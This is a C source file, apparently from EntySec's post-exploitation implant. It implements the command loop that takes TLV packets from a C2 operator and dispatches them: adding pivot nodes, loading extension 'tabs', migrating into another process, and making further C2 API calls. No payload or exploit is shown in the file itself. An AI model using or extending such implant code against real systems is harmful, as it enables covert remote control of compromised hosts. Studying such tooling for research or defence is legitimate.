/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <tlv.h>
#include <c2.h>
#include <net.h>
#include <node.h>
#include <migrate.h>
#include <tab.h>
#include <log.h>

#include <stdio.h>
#include <stdlib.h>

/*
 * Run TLV console loop which reads commands repeatedly.
 */

void tlv_console_loop(tlv_pkt_t *tlv_pkt)
{
    c2_api_calls_t *c2_api_calls = NULL;
    c2_register_api_calls(&c2_api_calls);

    tabs_t *tabs = NULL;
    nodes_t *nodes = NULL;

    int node_id = 0;

    for (;;)
    {
        tlv_pkt_t *tlv_result;
        tlv_channel_read(tlv_pkt, TLV_NULL);

        log_debug("* Talking to %d for now from base\n", tlv_pkt->channel);

        if (tlv_pkt->pool == API_POOL_BUILTINS)
        {
            if (tlv_pkt->tag == API_QUIT)
            {
                tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_SUCCESS);
                tlv_channel_send(tlv_result);

                tlv_pkt_free(tlv_result);
                break;
            }

            if (tlv_pkt->tag == API_ADD_NODE)
            {
                tlv_pkt_t **tlv_argv;
                tlv_argv_read(tlv_pkt, &tlv_argv, 4, TLV_NO_NULL);

                node_add(&nodes, node_id,
                          UNPACK_INT(tlv_argv[0]->data),
                          UNPACK_INT(tlv_argv[1]->data),
                          UNPACK_INT(tlv_argv[2]->data),
                          UNPACK_INT(tlv_argv[3]->data));
                node_id += 1;

                tlv_argv_free(tlv_argv, 4);

            } else if (tlv_pkt->tag == API_DEL_NODE)
            {
                tlv_pkt_t **tlv_argv;
                tlv_argv_read(tlv_pkt, &tlv_argv, 1, TLV_NO_NULL);

                node_delete(&nodes, UNPACK_INT(tlv_argv[0]->data));
                tlv_argv_free(tlv_argv, 1);

            } else if (tlv_pkt->tag == API_ADD_TAB)
            {
                tlv_pkt_t **tlv_argv;
                tlv_argv_read(tlv_pkt, &tlv_argv, 2, TLV_NO_NULL);

                tab_add(&tabs, UNPACK_INT(tlv_argv[0]->data), tlv_argv[1]->data);
                tlv_argv_free(tlv_argv, 2);

            } else if (tlv_pkt->tag == API_DEL_TAB)
            {
                tlv_pkt_t **tlv_argv;
                tlv_argv_read(tlv_pkt, &tlv_argv, 1, TLV_NO_NULL);

                tab_delete(&tabs, UNPACK_INT(tlv_argv[0]->data));
                tlv_argv_free(tlv_argv, 1);

            } else if (tlv_pkt->tag == API_MIGRATE)
            {
                tlv_pkt_t **tlv_argv;
                tlv_argv_read(tlv_pkt, &tlv_argv, 2, TLV_NO_NULL);

                if (migrate_init(tlv_pkt, UNPACK_INT(tlv_argv[0]->data), tlv_argv[1]->size, tlv_argv[1]->data) == 0)
                {
                    tlv_argv_free(tlv_argv, 2);
                    tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_SUCCESS);
                    tlv_channel_send(tlv_result);

                    tlv_pkt_free(tlv_result);
                    break;
                }
            }

            tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_SUCCESS);
            tlv_channel_send(tlv_result);

            tlv_pkt_free(tlv_result);
            continue;
        }

        tlv_result = c2_make_api_call(&c2_api_calls, tlv_pkt);

        if (tlv_result != NULL)
        {
            tlv_channel_send(tlv_result);
        } else
        {
            if (tab_lookup(&tabs, tlv_pkt->pool, tlv_pkt) < 0)
            {
                tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_NOT_IMPLEMENTED);
                tlv_channel_send(tlv_result);
            }
        }

        tlv_pkt_free(tlv_result);
    }

    nodes_free(nodes);
    tabs_free(tabs);

    c2_api_calls_free(c2_api_calls);
}

/*
 * Run TLV tab loop which reads commands repeatedly.
 */

void tab_console_loop(c2_api_calls_t *c2_api_calls)
{
    tlv_pkt_t *tlv_pkt = tlv_channel_pkt(TLV_NO_CHANNEL);

    for (;;)
    {
        tlv_channel_read_fd(STDIN_FILENO, tlv_pkt, TLV_NULL);
        log_debug("* Talking to %d for now from tab\n", tlv_pkt->channel);

        if (tlv_pkt->tag == API_QUIT)
            break;

        tlv_pkt_t *tlv_result = c2_make_api_call(&c2_api_calls, tlv_pkt);

        if (tlv_result != NULL)
        {
            tlv_channel_send(tlv_result);

            log_debug("* Tab forced to (pool: %d, tag: %d, fd: %d)\n", tlv_result->pool,
                      tlv_result->tag, tlv_result->channel);

        } else
        {
            tlv_result = create_c2_tlv_pkt(tlv_pkt, API_CALL_NOT_IMPLEMENTED);

            tlv_channel_send(tlv_result);
        }

        tlv_data_free(tlv_result);
    }

    tlv_pkt_free(tlv_pkt);
}
